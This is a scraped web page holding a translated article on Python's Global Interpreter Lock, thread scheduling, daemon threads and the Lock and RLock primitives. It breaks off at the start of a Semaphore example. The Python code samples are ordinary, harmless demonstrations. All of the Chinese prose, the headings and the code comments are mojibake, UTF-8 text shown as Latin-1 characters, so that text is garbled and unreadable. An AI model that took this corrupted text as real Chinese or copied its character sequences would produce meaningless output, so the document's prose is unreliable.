                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»17åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><em>æœ¬æ–‡æ·±å…¥æ¢è®¨äº† Python å…¨å±€è§£é‡Šå™¨é”ï¼ˆGILï¼‰çš„å†…éƒ¨æœºåˆ¶ï¼Œæ­ç¤ºå…¶å¯¹å¤šçº¿ç¨‹æ€§èƒ½çš„å½±å“ï¼Œå¸®åŠ©å¼€å‘è€…ç†è§£å¦‚ä½•åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸­ä¼˜åŒ– Python åº”ç”¨ã€‚åŸæ–‡ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fjinlow.medium.com%2Ftearing-off-the-gil-veil-a-deep-dive-into-python-multithreadings-inner-mechanics-a94c92546e79" title="https://jinlow.medium.com/tearing-off-the-gil-veil-a-deep-dive-into-python-multithreadings-inner-mechanics-a94c92546e79" target="_blank" ref="nofollow noopener noreferrer">Tearing Off the GIL Veil: A Deep Dive into Python Multithreading's Inner Mechanics</a></em></p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4c8cee8fb14645598325d56217a33e34~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-e5Yeh:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767590897&amp;x-signature=3ujku6lT3MBOvKd2w%2FVNfs0HZ7Q%3D" alt="" loading="lazy"/></p>
<p>Python å…¨å±€è§£é‡Šå™¨é”ï¼ˆGILï¼ŒGlobal Interpreter Lockï¼‰å¼•å‘çš„è®¨è®ºæ¯”å…¶ä»–ä»»ä½•è¯­è¨€åŠŸèƒ½éƒ½å¤šã€‚ä¸æ­¢ä½ ä¸€ä¸ªäººåœ¨çœ‹åˆ° CPU æ ¸å¿ƒé—²ç½®ï¼Œè€Œ Python è„šæœ¬ç¼“æ…¢è¿è¡Œæ—¶ï¼Œä¼šè§‰å¾—ç–‘æƒ‘ã€‚ä½ ä¹Ÿä¸æ˜¯å”¯ä¸€ä¸€ä¸ªæƒ³çŸ¥é“ä¸ºä»€ä¹ˆå¢åŠ çº¿ç¨‹æœ‰æ—¶ä¼šè®©ä»£ç å˜æ…¢ã€‚è¿™ä¸ä»…æ˜¯å­¦æœ¯ä¸Šçš„å¥½å¥‡å¿ƒï¼Œè€Œæ˜¯å› ä¸ºç†è§£ GIL å†³å®šäº†ä½ æ˜¯åœ¨æ„å»ºå¯æ‰©å±•çš„ç³»ç»Ÿè¿˜æ˜¯åœ¨é«˜è´Ÿè½½ä¸‹ä¼šå´©æºƒçš„ç³»ç»Ÿã€‚</p>
<p>è¯´å®è¯ï¼Œå¤§å¤šæ•° Python å¼€å‘è€…éƒ½è¯¯è§£äº† GILã€‚ä»–ä»¬è¦ä¹ˆæŠŠ GIL å½“ä½œè‡´å‘½å› ç´ ï¼Œè¦ä¹ˆå®Œå…¨å¿½è§†ï¼Œè€Œè¿™ä¸¤ç§æƒ³æ³•éƒ½æ˜¯é”™è¯¯çš„ã€‚äº‹å®æ›´ä¸ºå¤æ‚ï¼Œä¹Ÿæ›´æœ‰è¶£ã€‚</p>
<h2 data-id="heading-0">æ­å¼€ GIL é¢çº± â€”â€” è¿™åˆ°åº•æ˜¯ä»€ä¹ˆï¼Ÿ</h2>
<p>è¦çœŸæ­£æŒæ¡ Python å¤šçº¿ç¨‹ï¼Œå¿…é¡»å…ˆå¾æœ GIL ç³»ç»Ÿï¼Œè¿™æ˜¯æ— æ³•å›é¿çš„ã€‚</p>
<h5 data-id="heading-1">GIL å®è´¨</h5>
<p>GIL æ˜¯ CPython è§£é‡Šå™¨å†…éƒ¨çš„ä¸€ä¸ªäº’æ–¥é”ã€‚å®ƒçš„å·¥ä½œçœ‹ä¼¼ç®€å•ï¼šç¡®ä¿ä»»ä½•æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œ Python å­—èŠ‚ç ã€‚å¯ä»¥æŠŠå®ƒçœ‹ä½œæ˜¯ä¸€æ¬¡æ€§åå°é€šè¡Œè¯ â€”â€” æ— è®ºæœ‰å¤šå°‘è¡¨æ¼”è€…ï¼ˆçº¿ç¨‹ï¼‰ï¼ŒåŒä¸€æ—¶é—´åªèƒ½æœ‰ä¸€ä¸ªä¸Šå°ã€‚</p>
<p>è¿™é‡Œæœ‰ä¸ªå¤§å¤šæ•°æ•™ç¨‹éƒ½ä¼šå¿½ç•¥çš„å…³é”®è§è§£ï¼šGIL ä¿æŠ¤çš„æ˜¯è§£é‡Šå™¨ï¼Œè€Œä¸æ˜¯åº”ç”¨ä¸šåŠ¡ä»£ç ã€‚å®ƒå­˜åœ¨äºåº”ç”¨é€»è¾‘ä¹‹ä¸‹çš„ä¸€ä¸ªå±‚çº§ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7e74e71d253141edad4272d396ccab33~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-e5Yeh:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767590897&amp;x-signature=L5gbf5fuOrG0xGV3Ydueghzwd90%3D" alt="æ“ä½œç³»ç»Ÿä¸­çš„å¤šçº¿ç¨‹" loading="lazy"/></p>
<h5 data-id="heading-2">ä¸ºä»€ä¹ˆéœ€è¦ GILï¼Ÿ</h5>
<p>GIL å¹¶éä¸ºäº†æŠ˜ç£¨å¼€å‘è€…ï¼Œè€Œæ˜¯åŸºäº Python å†…å­˜ç®¡ç†æ¶æ„çš„åŠ¡å®å·¥ç¨‹å†³ç­–ã€‚</p>
<h6 data-id="heading-3">å‚è€ƒè®¡æ•°é—®é¢˜</h6>
<p>Python å†…å­˜ç®¡ç†ä¾èµ–å¼•ç”¨è®¡æ•°ã€‚æ¯ä¸ªå¯¹è±¡éƒ½ç»´æŠ¤ä¸€ä¸ª <code>ob_refcnt</code> å˜é‡ï¼Œè·Ÿè¸ªæŒ‡å‘å®ƒçš„å¼•ç”¨æ•°é‡ã€‚å½“è®¡æ•°å½’é›¶æ—¶ï¼Œå¯¹è±¡ä¼šè¢«åƒåœ¾å›æ”¶ã€‚å¬èµ·æ¥å¾ˆç®€å•ï¼Œå¯¹å§ï¼Ÿ</p>
<p>æ··ä¹±ç”±æ­¤å¼€å§‹ã€‚è€ƒè™‘æ²¡æœ‰ GIL çš„æƒ…æ™¯ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ä¼ªä»£ç æ¼”ç¤ºç«æ€æ¡ä»¶ä¸‹çš„å±é™©æ€§</span>
<span class="hljs-comment"># çº¿ç¨‹ 1: </span>
a = <span class="hljs-string">"Hello"</span>  <span class="hljs-comment"># è¯»å– ob_refcnt = 1, å‡†å¤‡å¢åŠ </span>

<span class="hljs-comment"># çº¿ç¨‹ 2 (å¹¶å‘):</span>
<span class="hljs-keyword">del</span> a       <span class="hljs-comment"># è¯»å– ob_refcnt = 1, å‡†å¤‡å‡å°‘</span>

<span class="hljs-comment"># å¦‚æœæ²¡æœ‰åŒæ­¥ï¼Œæœ€ç»ˆç»“æœå¯èƒ½æ˜¯ 0, 1, æˆ– 2</span>
<span class="hljs-comment"># ç»“æœ: å†…å­˜æ³„æ¼æˆ–ç¾éš¾æ€§å´©æºƒ</span>
</code></pre>
<p>æ²¡æœ‰ä¿æŠ¤ï¼Œå¹¶å‘çº¿ç¨‹ä¼šæŸåå¼•ç”¨è®¡æ•°ï¼Œå¯¼è‡´å†…å­˜æ³„æ¼ï¼ˆå¯¹è±¡æœªè¢«é‡Šæ”¾ï¼‰æˆ–åˆ†æ®µé”™è¯¯ï¼ˆå¯¹è±¡è¿‡æ—©é‡Šæ”¾ï¼‰ã€‚CPython å›¢é˜Ÿé¢ä¸´æŠ‰æ‹©ï¼š</p>
<ol>
<li>ç»†ç²’åº¦é”å®šï¼šä¸ºæ¯ä¸ªå¯¹è±¡å’Œæ“ä½œæ·»åŠ é”</li>
<li>å…¨å±€é”ï¼šä¸€ä¸ªä¸»é”æ§åˆ¶è§£é‡Šå™¨è®¿é—®</li>
</ol>
<p>ä»–ä»¬é€‰æ‹©äº†ç¬¬äºŒä¸ªé€‰é¡¹ã€‚ä¸ºä»€ä¹ˆï¼Ÿå› ä¸ºç»†ç²’åº¦é”å®šä¼šè®© Python çš„å•çº¿ç¨‹æ€§èƒ½ï¼ˆå¸¸è§æƒ…å†µï¼‰å¤§å¹…ä¸‹é™ï¼Œè€Œä¸ C æ‰©å±•é›†æˆä¹Ÿä¼šå˜æˆä¸€åœºå™©æ¢¦ã€‚</p>
<h5 data-id="heading-4">GIL çš„å®é™…æ€§èƒ½å½±å“</h5>
<p>å¤§å¤šæ•°æ–‡ç« éƒ½è¯´é”™äº†çœŸç›¸ï¼šGIL å¹¶ä¸æ˜¯æ°¸ä¹…é”ã€‚è§£é‡Šå™¨ä¼šç­–ç•¥æ€§çš„è¿›è¡Œé‡Šæ”¾ï¼š</p>
<ol>
<li>åœ¨æ‰§è¡Œå­—èŠ‚ç æŒ‡ä»¤åï¼Œç°ä»£ Pythonï¼ˆ3.2+ï¼‰é‡‡ç”¨åŸºäºæ—¶é—´çš„åˆ‡æ¢ â€”â€” é»˜è®¤æ¯ 5ms ä¸€æ¬¡</li>
<li>åœ¨ I/O æ“ä½œæœŸé—´ï¼šæ–‡ä»¶è¯»å–ã€ç½‘ç»œè¯·æ±‚å’Œæ•°æ®åº“æŸ¥è¯¢éƒ½ä¼šè§¦å‘ GIL é‡Šæ”¾</li>
<li>åœ¨è°ƒç”¨ C æ‰©å±•æ—¶ï¼Œè®¸å¤š NumPy/SciPy å‡½æ•°ä¼šé‡Šæ”¾ GIL</li>
<li>åœ¨ <code>time.sleep()</code> æœŸé—´ï¼šæ˜ç¡®é‡Šæ”¾ GIL</li>
</ol>
<p>æ€§èƒ½å½±å“å¯ä»¥æ˜ç¡®åˆ’åˆ†ï¼š</p>
<ul>
<li>CPU å¯†é›†å‹ä»»åŠ¡ï¼šçº¿ç¨‹å¼€é”€å¢åŠ ï¼Œä½†æ²¡æœ‰å¹¶è¡Œæ€§ã€‚çº¿ç¨‹èŠ±æ›´å¤šæ—¶é—´ç”¨äºäº‰å¤º GIL è€Œéè®¡ç®—ã€‚ä¸Šä¸‹æ–‡åˆ‡æ¢æˆæœ¬é«˜æ˜‚ï¼Œæ€§èƒ½é€šå¸¸æ¯”å•çº¿ç¨‹ä»£ç å·® ã€‚</li>
<li>I/O å¯†é›†å‹ä»»åŠ¡ï¼šçº¿ç¨‹åœ¨è¿™é‡Œå¤§æ”¾å¼‚å½©ã€‚å½“æŸä¸ªçº¿ç¨‹ç­‰å¾…ç½‘ç»œå“åº”æ—¶ï¼Œå…¶ä»–çº¿ç¨‹å¯ä»¥æ‰§è¡Œã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆç½‘é¡µæœåŠ¡å™¨ã€ç½‘é¡µçˆ¬è™«å™¨å’Œ API å®¢æˆ·ç«¯ä»çº¿ç¨‹ä¸­è·ç›Šå·¨å¤§ã€‚</li>
</ul>
<h2 data-id="heading-5">å†…éƒ¨æœºåˆ¶ â€”â€” Python å¦‚ä½•è°ƒåº¦çº¿ç¨‹</h2>
<p>å½“ä»£ç è°ƒç”¨ <code>thread.start()</code> æ—¶ï¼Œåº•å±‚å®é™…ä¸Šåœ¨å¹²ä»€ä¹ˆï¼Ÿæˆ‘ä»¬ä¸€å±‚å±‚å‰¥å¼€ã€‚</p>
<h5 data-id="heading-6">ç”¨æˆ·ç©ºé—´ä¸å†…æ ¸ç©ºé—´ï¼šçº¿ç¨‹æ‰€åœ¨</h5>
<p>Python çš„ <code>threading</code> æ¨¡å—ä¼šå°è£…æœ¬åœ°æ“ä½œç³»ç»Ÿçº¿ç¨‹ï¼Œç†è§£è¿™ä¸€ç‚¹è‡³å…³é‡è¦ï¼š</p>
<ul>
<li>æ¯ä¸ª Python çº¿ç¨‹å¯¹åº”ä¸€ä¸ªçœŸå®çš„æ“ä½œç³»ç»Ÿçº¿ç¨‹ï¼ˆUnix ä¸Šçš„ POSIX çº¿ç¨‹ï¼ŒWindows ä¸Šçš„ Windows çº¿ç¨‹ï¼‰</li>
<li>æ“ä½œç³»ç»Ÿè°ƒåº¦å™¨ç»™çº¿ç¨‹åˆ†é… CPU æ—¶é—´</li>
<li>Python è§£é‡Šå™¨åœ¨æ“ä½œç³»ç»Ÿè°ƒåº¦ä¹‹ä¸Šç®¡ç† GIL åˆ†å‘</li>
</ul>
<p>è¿™å½¢æˆäº†åŒå±‚ç³»ç»Ÿï¼Œæ“ä½œç³»ç»Ÿå†³å®šå“ªä¸ªçº¿ç¨‹è·å¾— CPU æ—¶é—´ ï¼Œè€Œ GIL å†³å®šå“ªä¸ªçº¿ç¨‹èƒ½æ‰§è¡Œ Python ä»£ç ã€‚</p>
<h5 data-id="heading-7">æŠ¢å å¼è°ƒåº¦åŠå…¶é™·é˜±</h5>
<p>CPython ä½¿ç”¨æŠ¢å å¼çº¿ç¨‹è°ƒåº¦ï¼Œä»¥ä¸‹æ˜¯ Python 3.2+ çš„æ—¶é—´çº¿ï¼š</p>
<p>åœ¨ Python 3.2 ä¹‹å‰ï¼Œè§£é‡Šå™¨æ¯ 100 å­—èŠ‚æŒ‡ä»¤å‘å¸ƒä¸€æ¬¡ GILï¼ˆå¯é€šè¿‡ç°å·²å¼ƒç”¨çš„ <code>sys.setcheckinterval()</code> é…ç½®ï¼‰ã€‚</p>
<p>Python 3.2 èµ·ï¼Œæ”¹ç”¨ <code>sys.setswitchinterval()</code>ï¼Œæ”¹ä¸ºåŸºäºæ—¶é—´çš„é—´éš”ï¼Œé»˜è®¤ 5msã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> sys

<span class="hljs-comment"># æ£€æŸ¥å½“å‰åˆ‡æ¢é—´éš” (Python 3.2+)</span>
interval = sys.getswitchinterval()
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"Switch interval: <span class="hljs-subst">{interval}</span>s"</span>)  <span class="hljs-comment"># é»˜è®¤: 0.005</span>

<span class="hljs-comment"># å¦‚æœéœ€è¦ï¼Œè¯·è°ƒæ•´ï¼ˆå¾ˆå°‘éœ€è¦è°ƒæ•´ï¼‰</span>
sys.setswitchinterval(<span class="hljs-number">0.001</span>)  <span class="hljs-comment"># 1ms - å“åº”æ›´åŠæ—¶ï¼Œä½†å¼€é”€æ›´é«˜</span>
</code></pre>
<p>é¥¥é¥¿é—®é¢˜ï¼šå¦‚æœä»£ç æ‰§è¡Œæ²¡æœ‰ I/O çš„é•¿æ—¶é—´äº‹åŠ¡ï¼Œå¯èƒ½ä¼šé•¿æ—¶é—´å„æ–­ GILï¼Œå…¶ä»–çº¿ç¨‹åˆ™ä¼šâ€œé¥¥é¥¿â€ï¼Œæ— åŠ©çš„ç­‰å¾…ã€‚</p>
<h5 data-id="heading-8">GIL è¶…æ—¶ï¼ˆPython 3.2+æ”¹è¿›ç‰ˆï¼‰</h5>
<p>David Beazley çš„ç ”ç©¶æ­ç¤ºäº† Python 3.2 ä¹‹å‰çš„ä¸€ä¸ªå…³é”®ç¼ºé™·ï¼šå½“ CPU å’Œ I/O é™åˆ¶çº¿ç¨‹ç«äº‰æ—¶ï¼Œç³»ç»Ÿä¼šå› ä¸Šä¸‹æ–‡åˆ‡æ¢è€Œå¡é¡¿ï¼Œæ¯æ¬¡åˆ‡æ¢å¢åŠ  5ms çš„å¼€é”€ã€‚</p>
<p>Python 3.2 å¼•å…¥äº†è¶…æ—¶æœºåˆ¶ã€‚å½“çº¿ç¨‹æƒ³è¦ GIL ä½†æ— æ³•è·å¾—æ—¶ï¼Œä¼šå¯åŠ¨è¶…æ—¶å¹¶ç­‰å¾…ã€‚å¦‚æœè¶…æ—¶ç»“æŸï¼ˆ5msï¼‰ï¼Œçº¿ç¨‹ä¼šè®¾ç½®â€œgil drop requestâ€æ ‡å¿—ã€‚å½“å‰çº¿ç¨‹å®šæœŸæ£€æŸ¥è¯¥æ ‡å¿—å¹¶ç”Ÿæˆ GILã€‚</p>
<p>å°½ç®¡å¹¶æœªå®Œå…¨æ¶ˆé™¤ GIL çš„äº‰è®®å¼€é”€ï¼Œä½†æå¤§æå‡äº†å…¬å¹³æ€§ï¼Œ</p>
<h2 data-id="heading-9">æ ¸å¿ƒå‚æ•°ä¸åŒæ­¥åŸè¯­çš„å®é™…åº”ç”¨</h2>
<p>æ²¡æœ‰å®è·µçš„ç†è®ºæ˜¯æ²¡ç”¨çš„ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬æ·±å…¥æ¢è®¨å®é™…ç”Ÿäº§ç¯å¢ƒçš„åŒæ­¥ä»£ç ã€‚</p>
<h5 data-id="heading-10">çº¿ç¨‹æ ¸å¿ƒå‚æ•°è§£æ</h5>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> threading
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">worker</span>(<span class="hljs-params">name: <span class="hljs-built_in">str</span>, delay: <span class="hljs-built_in">float</span>, result_list: <span class="hljs-type">List</span>[<span class="hljs-built_in">str</span>]</span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-string">"""
    çº¿ç¨‹å·¥ä½œå‡½æ•°ã€‚
    
    å…³é”®æ´å¯Ÿï¼šè¿”å›å€¼è¢«çº¿ç¨‹å¯¹è±¡å¿½ç•¥ã€‚
    ä½¿ç”¨å…±äº«æ•°æ®ç»“æ„ï¼ˆå¦‚result_listï¼‰æ¥æ”¶é›†ç»“æœã€‚
    """</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ğŸ¬ Thread-<span class="hljs-subst">{name}</span>: starting"</span>)
    time.sleep(delay)  <span class="hljs-comment"># Simulates I/O-GIL released here</span>
    result = <span class="hljs-string">f"âœ… Thread-<span class="hljs-subst">{name}</span> completed after <span class="hljs-subst">{delay}</span>s"</span>
    result_list.append(result)
    <span class="hljs-keyword">return</span> result  <span class="hljs-comment"># This return value is lost!</span>
<span class="hljs-comment"># å…±äº«ç»“æœå­˜å‚¨</span>
results: <span class="hljs-type">List</span>[<span class="hljs-built_in">str</span>] = []
<span class="hljs-comment"># ä½¿ç”¨æ‰€æœ‰å‚æ•°åˆ›å»ºçº¿ç¨‹</span>
t = threading.Thread(
    target=worker,
    args=(<span class="hljs-string">"A"</span>, <span class="hljs-number">2</span>),              <span class="hljs-comment"># ä½ç½®å‚æ•°</span>
    kwargs={<span class="hljs-string">"result_list"</span>: results},  <span class="hljs-comment"># å…³é”®å­—å‚æ•°</span>
    name=<span class="hljs-string">"Worker-A"</span>,             <span class="hljs-comment"># ğŸ”¥ å¯¹è°ƒè¯•è‡³å…³é‡è¦</span>
    daemon=<span class="hljs-literal">True</span>                  <span class="hljs-comment"># ğŸ”¥ å®ˆæŠ¤è¿›ç¨‹çš„è¡Œä¸ºå°†åœ¨åé¢è§£é‡Š</span>
)
t.start()  <span class="hljs-comment"># å¯åŠ¨çº¿ç¨‹</span>
t.join(timeout=<span class="hljs-number">3</span>)  <span class="hljs-comment"># æœ€å¤šç­‰å¾… 3s å®Œæˆ</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"Results: <span class="hljs-subst">{results}</span>"</span>)
</code></pre>
<p>ç†è§£ <code>daemon=True</code>ï¼š</p>
<ul>
<li><code>daemon=False</code>ï¼ˆé»˜è®¤ï¼‰ï¼šä¸»çº¿ç¨‹ç­‰å¾…æ‰€æœ‰å­çº¿ç¨‹å®Œæˆåé€€å‡º</li>
<li><code>daemon=True</code>ï¼šä¸»çº¿ç¨‹å¼ºåˆ¶ç»ˆæ­¢æ‰€æœ‰å®ˆæŠ¤çº¿ç¨‹</li>
</ul>
<p>ä½•æ—¶ä½¿ç”¨å®ˆæŠ¤çº¿ç¨‹ï¼š</p>
<ul>
<li>âœ… åå°ä»»åŠ¡ï¼šå¿ƒè·³ç›‘æµ‹ã€ç¼“å­˜åˆ·æ–°ã€æ—¥å¿—è½®æ¢</li>
<li>âŒ å…³é”®æ“ä½œï¼šæ•°æ®åº“å†™å…¥ã€æ–‡ä»¶ä¿å­˜ã€è´¢åŠ¡äº¤æ˜“</li>
</ul>
<p>å®ˆæŠ¤çº¿ç¨‹å¯èƒ½åœ¨è¿è¡Œä¸­è¢«ä¸­æ–­ï¼Œå¯èƒ½å¯¼è‡´æ•°æ®æŸåæˆ–äº‹åŠ¡ä¸å®Œæ•´ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ae3d849fd36b4b7abecc3367775ecd4f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-e5Yeh:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767590897&amp;x-signature=iYqkW3L7KtWC1dPHuny3%2Bk3mLYI%3D" alt=".NET ä¸­çš„çº¿ç¨‹åŒæ­¥ä¸é”" loading="lazy"/></p>
<h5 data-id="heading-11">äº”ä¸ªåŸºæœ¬åŒæ­¥åŸè¯­</h5>
<h6 data-id="heading-12">1. é”å®šï¼ˆäº’æ–¥ï¼‰</h6>
<p>åŸºæœ¬æ„å»ºæ¨¡å—ï¼Œä¸€æ¬¡åªèƒ½æœ‰ä¸€ä¸ªçº¿ç¨‹è·å¾—é”ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> threading

balance = <span class="hljs-number">0</span>
lock = threading.Lock()
<span class="hljs-keyword">def</span> <span class="hljs-title function_">deposit</span>(<span class="hljs-params">amount: <span class="hljs-built_in">int</span>, iterations: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-literal">None</span>:
    <span class="hljs-keyword">global</span> balance
    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(iterations):
        <span class="hljs-keyword">with</span> lock:  <span class="hljs-comment"># è‡ªåŠ¨è·å–å’Œé‡Šæ”¾</span>
            balance += amount
<span class="hljs-keyword">def</span> <span class="hljs-title function_">withdraw</span>(<span class="hljs-params">amount: <span class="hljs-built_in">int</span>, iterations: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-literal">None</span>:
    <span class="hljs-keyword">global</span> balance
    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(iterations):
        <span class="hljs-keyword">with</span> lock:
            balance -= amount
<span class="hljs-comment"># æµ‹è¯•ç«æ€æ¡ä»¶ä¿æŠ¤</span>
t1 = threading.Thread(target=deposit, args=(<span class="hljs-number">1</span>, <span class="hljs-number">100000</span>))
t2 = threading.Thread(target=withdraw, args=(<span class="hljs-number">1</span>, <span class="hljs-number">100000</span>))
t1.start()
t2.start()
t1.join()
t2.join()
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"ğŸ’° Final balance: <span class="hljs-subst">{balance}</span>"</span>)  <span class="hljs-comment"># é”å®šæ—¶åº”ä¸º 0ï¼Œæœªé”å®šæ—¶éšæœº</span>
</code></pre>
<p>ç”Ÿäº§ç¯å¢ƒå°è´´å£«ï¼šå§‹ç»ˆä½¿ç”¨ä¸Šä¸‹æ–‡ç®¡ç†å™¨ï¼ˆ<code>with lock:</code>ï¼‰ï¼Œè€Œä¸æ˜¯æ‰‹åŠ¨æ“ä½œ <code>lock.acquire()</code> å’Œ <code>lock.release()</code>ï¼Œè®©å…¶è‡ªåŠ¨å¤„ç†å¼‚å¸¸ã€‚</p>
<h6 data-id="heading-13">2. RLockï¼ˆå¯é‡å…¥é”ï¼‰</h6>
<p>å…è®¸åŒä¸€çº¿ç¨‹å¤šæ¬¡è·å¾—é” â€”â€” è¿™å¯¹é€’å½’å‡½æ•°è‡³å…³é‡è¦ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> threading

rlock = threading.RLock()

<span class="hljs-keyword">def</span> <span class="hljs-title function_">recursive_func</span>(<span class="hljs-params">n: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-literal">None</span>:
    <span class="hljs-keyword">with</span> rlock:  <span class="hljs-comment"># åŒä¸€çº¿ç¨‹å¯ä»¥å¤šæ¬¡è·å–é”</span>
        <span class="hljs-keyword">if</span> n &gt; <span class="hljs-number">0</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ğŸ” Level <span class="hljs-subst">{n}</span>"</span>)
            recursive_func(n - <span class="hljs-number">1</span>)  <span class="hljs-comment"># é‡æ–°è·å–é”</span>
<span class="hljs-comment"># å¯åŠ¨æµ‹è¯•</span>
threading.Thread(target=recursive_func, args=(<span class="hljs-number">5</span>,)).start()
</code></pre>
<p>ä½•æ—¶ä½¿ç”¨ RLockï¼šè°ƒç”¨åŒä¸€å¯¹è±¡å†…å…¶ä»–åŒæ­¥æ–¹æ³•çš„æ–¹æ³•ã€‚</p>
<h6 data-id="heading-14">3. ä¿¡å·ï¼ˆè®¡æ•°é”ï¼‰</h6>
<p>æ§åˆ¶åŒæ—¶è®¿é—®èµ„æºçš„çº¿ç¨‹æ•°é‡ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> threading
<span class="hljs-keyword">import</span> time

